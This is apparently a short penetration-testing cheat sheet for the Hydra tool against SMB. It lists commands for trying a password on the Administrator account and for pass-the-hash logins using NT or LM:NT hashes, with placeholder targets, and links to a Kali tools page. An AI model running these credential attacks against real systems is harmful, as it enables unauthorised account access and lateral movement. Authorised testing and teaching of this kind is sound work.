# Hydra

`$ hydra -U smb`

`$ hydra -l Administrator -p <password> smb://<IP>`

- Pass the Hash

`$ hydra -l <username> -p <nt_hash> -m "" <IP> smb`

`$ hydra -l <username> -p <lm_hash>:<nt_hash> <IP> -m "LocalHash" smb`

---
## References

- [Hydra Protocols](https://en.kali.tools/?p=220)